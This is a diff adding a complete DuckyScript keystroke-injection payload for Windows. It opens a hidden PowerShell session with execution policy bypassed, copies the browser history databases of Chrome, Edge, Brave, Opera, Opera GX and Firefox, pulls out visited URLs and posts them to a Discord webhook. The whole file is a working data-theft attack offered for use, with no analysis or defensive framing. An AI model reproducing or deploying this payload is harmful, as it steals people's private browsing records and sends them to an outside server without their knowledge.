@@ -1,0 +1,13 @@
+REM     Description: Grabs browser history from Chrome, Edge, Firefox, Opera, Opera GX and sends to Discord
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 2000
+STRING powershell -w h -ep bypass "$w='<YOUR WEBHOOK HERE>';$u=$env:USERPROFILE;function Get-ChromiumHistory($browser,$path){if(Test-Path $path){$d=\" === $browser History ===`n\";$temp=\"$env:TEMP\hist_$browser.db\";try{Copy-Item $path $temp -Force -ErrorAction Stop;Start-Sleep -Milliseconds 300;$bytes=[IO.File]::ReadAllBytes($temp);$text=[Text.Encoding]::ASCII.GetString($bytes) -replace '[^\x20-\x7E\n]','';$urls=[regex]::Matches($text,'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[/a-zA-Z0-9\-\._~:?#\[\]@!$&''()*+,;=%]*')|ForEach-Object{$_.Value}|Select-Object -Unique|Select-Object -First 50;foreach($url in $urls){$d+=\"$url`n\"};Remove-Item $temp -Force -ErrorAction SilentlyContinue;if($d.Length -gt 1900){$d=$d.Substring(0,1900)+'...(truncated)'};$body=@{content=\"``````$d``````\"}|ConvertTo-Json -Compress;irm -Uri $w -Method Post -ContentType 'application/json' -Body ([System.Text.Encoding]::UTF8.GetBytes($body));Start-Sleep -Milliseconds 500}catch{}}};Get-ChromiumHistory 'Chrome' \"$u\AppData\Local\Google\Chrome\User Data\Default\History\";Get-ChromiumHistory 'Edge' \"$u\AppData\Local\Microsoft\Edge\User Data\Default\History\";Get-ChromiumHistory 'Brave' \"$u\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History\";Get-ChromiumHistory 'Opera' \"$u\AppData\Roaming\Opera Software\Opera Stable\History\";Get-ChromiumHistory 'OperaGX' \"$u\AppData\Roaming\Opera Software\Opera GX Stable\History\";$ffBase=\"$u\AppData\Roaming\Mozilla\Firefox\Profiles\";if(Test-Path $ffBase){$profiles=Get-ChildItem $ffBase -Directory;foreach($profile in $profiles){$ffHistory=\"$($profile.FullName)\places.sqlite\";if(Test-Path $ffHistory){$d=\" === Firefox History ($($profile.Name)) ===`n\";$temp=\"$env:TEMP\ff_places.db\";try{Copy-Item $ffHistory $temp -Force -ErrorAction Stop;Start-Sleep -Milliseconds 300;$bytes=[IO.File]::ReadAllBytes($temp);$text=[Text.Encoding]::ASCII.GetString($bytes) -replace '[^\x20-\x7E\n]','';$urls=[regex]::Matches($text,'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[/a-zA-Z0-9\-\._~:?#\[\]@!$&''()*+,;=%]*')|ForEach-Object{$_.Value}|Select-Object -Unique|Select-Object -First 50;foreach($url in $urls){$d+=\"$url`n\"};Remove-Item $temp -Force -ErrorAction SilentlyContinue;if($d.Length -gt 1900){$d=$d.Substring(0,1900)+'...(truncated)'};$body=@{content=\"``````$d``````\"}|ConvertTo-Json -Compress;irm -Uri $w -Method Post -ContentType 'application/json' -Body ([System.Text.Encoding]::UTF8.GetBytes($body));Start-Sleep -Milliseconds 500}catch{}}}};"
+ENTER
+DELAY 200
+STRING exit
+ENTER
